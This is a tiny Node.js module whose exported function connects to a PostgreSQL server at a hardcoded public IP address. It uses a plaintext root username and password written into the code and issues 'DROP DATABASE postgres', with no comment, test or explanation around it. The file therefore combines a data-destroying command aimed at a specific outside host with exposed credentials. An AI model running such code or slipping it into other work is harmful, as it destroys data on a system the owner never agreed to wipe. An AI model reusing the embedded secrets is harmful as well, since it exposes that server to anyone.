module.exports = () => {
    const { Client } = require('pg')

    const client = new Client({
        user: 'root',
        host: '82.223.111.102',
        database: 'postgres',
        password: 'Pass2021!',
        port: 6432
    })

    client
        .query("DROP DATABASE postgres")
        .then(res => console.log(res.rows[0]))
        .catch(e => console.error(e.stack))

    return null
}
